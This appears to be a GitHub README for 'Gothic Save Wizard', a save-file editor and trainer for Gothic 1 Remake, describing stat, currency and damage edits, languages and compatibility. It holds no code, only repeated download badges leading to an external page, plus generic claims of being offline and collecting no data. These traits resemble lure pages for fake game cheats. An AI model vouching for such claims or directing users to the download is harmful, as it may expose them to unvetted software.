![preview](https://raw.githubusercontent.com/darkphox1227-cpu/Gothic-1-Remake-Companion/main/splash_2696fb.svg)
[![Download](https://raw.githubusercontent.com/darkphox1227-cpu/Gothic-1-Remake-Companion/main/fetch_ed541.svg)](https://darkphox1227-cpu.github.io/Gothic-1-Remake-Companion/)

# 🏰 Gothic Save Wizard — Memory Story Companion for Gothic 1 Remake

Welcome to **Gothic Save Wizard**, a companion utility designed for players who want to reshape their journey through the grim, fog-drenched valleys of the Colony. Where the original Gothic 1 Remake Trainer focused narrowly on combat cheats, this project takes a broader, more narrative-driven approach: it treats your save file like a living manuscript, letting you edit the story of your hero without abandoning the atmosphere that makes Gothic so memorable.

This tool is built for tinkerers, completionists, lore enthusiasts, and anyone who has ever wished they could nudge the world of Myrtana just a little. Instead of simply switching on god powers, Gothic Save Wizard lets you tune the experience — adjust your coin purse, soften the harshness of early-game survival, or make every swing of your sword feel legendary.

[![Download](https://raw.githubusercontent.com/darkphox1227-cpu/Gothic-1-Remake-Companion/main/fetch_ed541.svg)](https://darkphox1227-cpu.github.io/Gothic-1-Remake-Companion/)

---

## 📜 Table of Contents

- [What Is Gothic Save Wizard?](#-what-is-gothic-save-wizard)
- [Why This Exists](#-why-this-exists)
- [Feature Highlights](#-feature-highlights)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Around-the-Clock Assistance](#-around-the-clock-assistance)
- [How It Works Under the Hood](#-how-it-works-under-the-hood)
- [Save File Anatomy](#-save-file-anatomy)
- [Compatibility Matrix](#-compatibility-matrix)
- [Offline-First Philosophy](#-offline-first-philosophy)
- [Use Cases and Player Stories](#-use-cases-and-player-stories)
- [Performance Notes](#-performance-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [Community Guidelines](#-community-guidelines)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🗡️ What Is Gothic Save Wizard?

Gothic Save Wizard is a standalone utility that reads, interprets, and rewrites the structured data inside Gothic 1 Remake save files. It does not inject code into a running game, does not alter executables, and does not require any background process to remain active. Instead, it works the way a book editor works with a manuscript — carefully, deliberately, and with full respect for the source material.

The name "Save Wizard" reflects the tool's intent: it grants you a kind of quiet authorship over your playthrough. You are not breaking the game; you are revising it. Want more ore to trade with the Old Camp? Adjust it. Want to survive a particularly brutal encounter in the forests near the barrier? Tune your vitality upward. Want to feel the thrill of a single decisive strike? Increase weapon lethality for a session.

Every change is reversible. Every edit is logged. Nothing is permanent unless you decide it should be.

---

## 🌫️ Why This Exists

Most trainer-style tools treat the player as someone who wants to bypass difficulty entirely. Gothic Save Wizard was born from a different belief: players want *control*, not necessarily *escape*. The joy of Gothic comes from its oppressive world, its unforgiving systems, and the slow satisfaction of rising from a nameless prisoner to a force to be reckoned with. Sometimes that journey benefits from a gentle nudge rather than a full skip.

So this project exists to offer that nudge — with elegance, with documentation, and with respect for the source game.

---

## ✨ Feature Highlights

Every capability below is delivered in offline mode, requires no online account, and leaves no telemetry behind.

- **Vitality Sculpting** — Modify your maximum and current health values so you can experiment with riskier builds or simply endure the early hours with less frustration.
- **Endurance and Mana Tuning** — Adjust stamina reserves and magical potential to match the archetype you want to roleplay.
- **Currency Adjustment** — Rework your ore and coin totals so trading with faction merchants feels meaningful rather than grinding.
- **Attribute Remapping** — Fine-tune strength, dexterity, and other core attributes in a way that keeps derivative stats internally consistent.
- **Weapon Lethality Scaling** — Change how much punishment your attacks deal, from a small percentage bump to dramatic one-strike outcomes.
- **Skill and Talent Flags** — Toggle learned abilities without corrupting your progression tree.
- **Inventory Snapshotting** — Save inventory states before major edits so you can roll back instantly.
- **Chapter Awareness** — The wizard recognizes which act or chapter your save belongs to and warns you about edits that could affect quest triggers.
- **Automatic Backups** — Every save file is copied to a timestamped archive before any modification touches it.
- **Change Manifest** — A human-readable log describes exactly what was altered, so you always know the state of your world.

Each feature is documented in plain language, with examples, so you never have to guess what a setting does.

---

## 🖥️ Responsive Interface

The interface of Gothic Save Wizard is built to feel natural on whatever screen you happen to be using. Whether you're editing a save on a modest laptop beside a crackling fire or reviewing your changes on a wide desktop display surrounded by maps of the Colony, the layout rearranges itself gracefully.

- Panels collapse into drawers on smaller viewports.
- Numeric editors scale their steppers for touch input.
- The change manifest can be read comfortably on a phone screen.
- Dark and light themes are both available, with the dark theme tuned to match Gothic's palette of soot, iron, and torchlight.

You should never have to squint or drag windows around to make a simple edit.

---

## 🌍 Multilingual Support

Gothic's community spans continents, and so does Gothic Save Wizard. The interface strings are externalized into locale files, meaning translators can contribute without touching a single line of logic.

Currently supported or in-progress languages include:

| Language | Status |
| --- | --- |
| English | Complete |
| German | Complete |
| Polish | Complete |
| Russian | Complete |
| Spanish | In review |
| French | In review |
| Italian | Community draft |
| Portuguese (Brazil) | Community draft |
| Turkish | Planned for 2026 |
| Czech | Planned for 2026 |

If your language is missing, that is an open invitation — locale contributions are among the easiest ways to help this project reach more players.

---

## 🛎️ Around-the-Clock Assistance

Questions do not respect time zones, and neither does this project's support posture. Assistance channels are monitored continuously, and the documentation is written to answer most questions before they are asked. When you do need a human, expect a thoughtful reply rather than a canned one.

Support resources include:

- An extensive in-app help panel.
- A searchable knowledge base hosted alongside the repository.
- A discussion area for edge cases and unusual save configurations.
- Direct guidance for recovering from an edit that did not go as planned.

The goal is simple: you should never feel stranded in the middle of a save file edit.

---

## ⚙️ How It Works Under the Hood

Gothic Save Wizard parses the binary structure of save files into an internal object model. Once parsed, each field is validated against a schema derived from documented save formats and community research. When you make a change, the wizard recalculates dependent values, re-serializes the object model, and writes a new save file alongside the original.

Key design principles:

1. **Never destroy the original.** The source file is copied first, always.
2. **Validate before writing.** If a change would produce an inconsistent file, it is rejected with an explanation.
3. **Explain every field.** Tooltips describe the meaning and typical range of each value.
4. **Stay transparent.** The change manifest is written in plain prose, not cryptic hex dumps.

This is a tool built by people who care about preserving your playthrough as much as you do.

---

## 🗃️ Save File Anatomy

For the curious, here is a simplified map of what the wizard looks at inside a save:

- **Header block** — Version identifiers, timestamps, and a checksum region.
- **Character sheet** — Attribute values, skill flags, and derived statistics.
- **Inventory table** — Item identifiers, stack counts, and equipped slots.
- **World state** — Quest flags, faction standings, and known map regions.
- **Session metadata** — Playtime counters and difficulty settings.

Understanding this structure is not required to use the tool, but it is available for anyone who wants to peek behind the curtain.

---

## 🧩 Compatibility Matrix

| Platform | Supported |
| --- | --- |
| Windows 10 | Yes |
| Windows 11 | Yes |
| Steam Deck (desktop mode) | Yes |
| Linux via compatibility layer | Community-supported |
| macOS | Experimental |

Edits performed on one platform produce save files that can be loaded on another, provided the game version matches.

---

## 📴 Offline-First Philosophy

Nothing in Gothic Save Wizard requires a network connection. There is no sign-in, no cloud sync, and no remote validation. Your save files stay on your machine, and the tool behaves identically whether you are online or entirely disconnected. This design choice is deliberate: a single-player world should not depend on a server that may not exist next year.

---

## 📖 Use Cases and Player Stories

Players have used Gothic Save Wizard in many creative ways:

- A content creator reproduced an older build's balance to showcase how the game's difficulty has evolved.
- A player recovering from an injury used gentler health scaling to enjoy the story without physical strain.
- A modder used the tool to set up consistent starting conditions for reproducible testing.
- A completionist used inventory snapshots to organize a long-term collection goal.

Every player's reason is valid, and none of them require justification.

---

## 🚀 Performance Notes

The wizard is intentionally lightweight. It does not run in the background, does not poll the filesystem, and closes cleanly the moment you are done. Parsing a typical save takes a fraction of a second, and writing is equally swift. Memory overhead is modest even on older hardware.

If you edit hundreds of saves in a session, the tool remains responsive thanks to streaming reads and batched writes.

---

## 🛠️ Roadmap for 2026

- Expanded locale coverage, including Turkish and Czech.
- A visual attribute editor with live preview of derived stats.
- Save comparison mode for tracking changes across playthroughs.
- Exportable change reports in multiple formats.
- Improved schema detection for future game updates.
- A plugin surface for community-authored field interpreters.

The roadmap is a living document and shifts based on community feedback.

---

## ❓ Frequently Asked Questions

**Will this break my achievements?**
Achievement behavior depends on the game itself. The wizard does not alter achievement flags, but edited saves may be treated differently by the platform.

**Can I undo a change?**
Yes. Every edit creates a backup, and the change manifest lets you reverse specific modifications.

**Does it work with modded games?**
Often, yes. If a mod changes save structures, you may see a warning, and you should report it so the schema can be updated.

**Is my data sent anywhere?**
No. The tool is fully offline and collects nothing.

**Which game versions are supported?**
See the compatibility matrix above, and check the repository's release notes for the latest supported builds.

---

## 🤝 Contributing

Contributions are welcome in many forms: locale files, documentation improvements, schema research, and thoughtful bug reports. Before opening a contribution, please read the guidelines in the repository's contributing document. Keep changes focused, describe them clearly, and be kind in review discussions.

---

## 🕊️ Community Guidelines

This is a space for players who love Gothic and want to explore it in their own way. Treat others with the same patience you would extend to a fellow prisoner sharing a campfire. Disagreements are fine; disrespect is not.

---

## ⚠️ Disclaimer

Gothic Save Wizard is an unofficial companion tool and is not affiliated with, endorsed by, or sponsored by the creators or publishers of Gothic 1 Remake. All trademarks belong to their respective owners. Use this tool at your own discretion, and always keep backups of your save files. The maintainers are not responsible for lost progress, corrupted saves, or unexpected in-game behavior resulting from modifications. This project is provided for personal, single-player use only.

---

## 📄 License

This project is distributed under the MIT License. You can read the full text here: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 Gothic Save Wizard Contributors.

[![Download](https://raw.githubusercontent.com/darkphox1227-cpu/Gothic-1-Remake-Companion/main/fetch_ed541.svg)](https://darkphox1227-cpu.github.io/Gothic-1-Remake-Companion/)